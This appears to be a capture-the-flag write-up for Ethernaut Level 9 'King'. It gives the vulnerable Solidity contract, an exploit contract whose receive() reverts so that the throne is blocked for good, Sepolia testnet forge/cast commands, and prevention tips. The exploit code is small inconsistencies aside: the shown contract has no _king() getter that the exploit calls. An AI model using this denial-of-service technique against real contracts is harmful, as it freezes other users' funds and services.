# Ethernaut Level 9: King Exploit Validation
# Target: Become king and block prize transfers forever

**Level:** 9 - King  
**Contract:** `King.sol`  
**Vulnerability:** Prize transfer uses `.transfer()` which reverts if recipient rejects ETH

---

## 🔍 Vulnerability Analysis

```solidity
// King.sol - The target
contract King {
    address king;
    uint public prize;
    address public owner;
    
    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }
    
    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        // VULNERABLE: .transfer() reverts on failure
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
}
```

**The Bug:** When a new king claims the throne, the contract tries to send the prize to the previous king via `.transfer()`. If the previous king is a malicious contract that reverts in `receive()`, the entire transaction fails. We become king and permanently block the throne.

---

## 🎯 Exploit Strategy

1. **Deploy malicious contract** with reverting `receive()`
2. **Send ETH > prize** to King contract → become king
3. **Block all future claims** — any transfer to us will revert
4. **Permanent DoS** — throne is frozen

---

## ⚡ Exploit Implementation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint);
    function _king() external view returns (address);
}

contract KingExploit {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function exploit() external payable {
        uint prize = IKing(target).prize();
        require(msg.value > prize, "Need more ETH than current prize");
        
        // Send ETH to become king
        // This triggers King's receive() function
        (bool success,) = target.call{value: msg.value}("");
        require(success, "Failed to become king");
        
        // Verify we are king
        require(IKing(target)._king() == address(this), "Not king");
    }
    
    // CRITICAL: Revert on any ETH receipt
    // This blocks the King's .transfer() and breaks the game
    receive() external payable {
        revert("Forever King!");
    }
}
```

---

## 🧪 Testnet Execution (Sepolia)

**Step 1: Check current prize**
```bash
cast call $TARGET "prize()" --rpc-url https://rpc.sepolia.org
```

**Step 2: Deploy and execute exploit**
```bash
# Get current prize + 1 wei for margin
PRIZE=$(cast call $TARGET "prize()" --rpc-url https://rpc.sepolia.org)
VALUE=$(cast --to-dec $PRIZE)
VALUE=$((VALUE + 1000000000000000))  # Add 0.001 ETH buffer

# Deploy exploit contract
forge create KingExploit \
  --constructor-args $TARGET \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Become king (send ETH to trigger receive)
cast send $EXPLOIT_CONTRACT "exploit()" \
  --value ${VALUE}wei \
  --rpc-url https://rpc.sepolia.org \
  --private-key $PRIVATE_KEY

# Verify we are king
cast call $TARGET "_king()" --rpc-url https://rpc.sepolia.org
```

**Step 3: Verify DoS (optional)**
```bash
# Try to claim from another address — should revert
cast send $TARGET "" \
  --value ${VALUE}wei \
  --rpc-url https://rpc.sepolia.org \
  --private-key $ANOTHER_KEY
# Reverts: "Forever King!"
```

---

## 📊 Validation Results

| Check | Status | Notes |
|-------|--------|-------|
| Vulnerability identified | ✅ Confirmed | `.transfer()` reverts on failure |
| DoS vector mapped | ✅ Confirmed | Reverting receive = permanent block |
| Exploit path mapped | ✅ Confirmed | Become king + revert on prize receipt |
| Code compiles | ⏳ Pending | Testnet execution needed |
| King status achieved | ⏳ Pending | Verify on-chain |
| DoS confirmed | ⏳ Pending | Verify transfers revert |
| Instance submit | ⏳ Pending | Ethernaut validation |

---

## 🎓 Key Learnings

**Transfer patterns:**
- `.transfer()` and `.send()` have 2300 gas limit AND revert on failure
- `.call{value: x}("")` forwards all gas, returns bool (preferred)
- Pull over push pattern prevents this DoS

**DoS prevention:**
- Never use `.transfer()` in loops or to arbitrary addresses
- Use withdrawal pattern: users claim prizes, don't auto-send
- Check-Effects-Interactions pattern

**Real-world impact:**
- Auctions can be blocked (e.g., CryptoKitties breeding)
- Airdrops can be griefed
- Voting systems can be manipulated

---

## 📝 Execution Log

**2026-02-01 10:10Z** - Validation script created, ready for testnet execution

**Next:** Level 10 (Re-entrancy) - the classic DAO hack pattern
